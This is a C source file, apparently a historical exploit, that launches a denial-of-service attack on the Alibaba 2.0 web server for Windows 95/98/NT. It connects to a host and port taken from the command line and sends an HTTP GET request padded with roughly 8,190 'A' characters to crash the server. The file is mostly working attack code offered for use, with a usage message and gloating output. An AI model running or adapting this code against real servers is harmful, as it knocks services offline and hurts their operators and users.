/*

 Description: DoS against Alibaba 2.0 WebServer by wildcoyote
 Comments   : Based on advisorie by Prizm<Prizm@RESENTMENT.org>
 Platforms  : Alibaba runs on Win95/98/NT
 Flamez to  : wildcoyote@coders-pt.org

*/

#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>

int 
openhost(char *host,int port) {
   int sock;
   struct sockaddr_in addr;
   struct hostent *he;
      
   he=gethostbyname(host);
   
   if (he==NULL) {
      perror("gethostbyname()");
      exit(-1); }
   
   sock=socket(AF_INET, SOCK_STREAM, getprotobyname("tcp")->p_proto);
    
   if (sock==-1) {
      perror("socket()");
      exit(-1); }
    
   memcpy(&addr.sin_addr, he->h_addr, he->h_length);
   addr.sin_family=AF_INET;
   addr.sin_port=htons(port);

   if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
      sock=-2; } 
    
   return sock;
}

void 
sends(int sock,char *buf) {
  write(sock,buf,strlen(buf));
}

void 
DoS(char *host, int port)
{
 int sock,i;
 char *buf;
 printf("\nDoS against Alibaba 2.0 WebServer by wildcoyote\n\n");
 printf("Trying to connect to %s (%d)....(please wait)\n",host,port);
 sock=openhost(host,port);
 if(sock<=0) {
     printf("- Could not connect -\n");
     printf("Exiting...\n\n");
     exit(-1);
 }
 else printf("Connected to %s (%d)\n",host,port);
 printf("Allocating memory for DoS\n");
 buf = (char *) malloc(8200); // it takes 8173 bytes, but i wave mem ;)
 strcpy(buf,"GET ");
 for(i=5;i<8198;i++) strcat(buf,"A");
 strcat(buf,"\n\n");
 printf("Oh k! Sending CRASH!\n");
 sends(sock,buf);
 close(sock);
 free(buf);
 printf("Crash sent! The host *probably* crashed :P\n");
 printf("Send flamez to wildcoyote@coders-pt.org, *Enjoy*...\n\n");
}

main(int argc, char *argv[])
{
 int sock,i;
 if (argc<2) {
    printf("\nDoS against Alibaba 2.0 WebServer by wildcoyote\n\n");
    printf("Sintaxe: %s <host> [port - default 80]\n",argv[0]);
    printf("Send flamez to wildcoyote@coders-pt.org, *Enjoy*...\n\n");
 }
 else if (argc==2) DoS(argv[1],80);
      else DoS(argv[1],atoi(argv[2]));
}
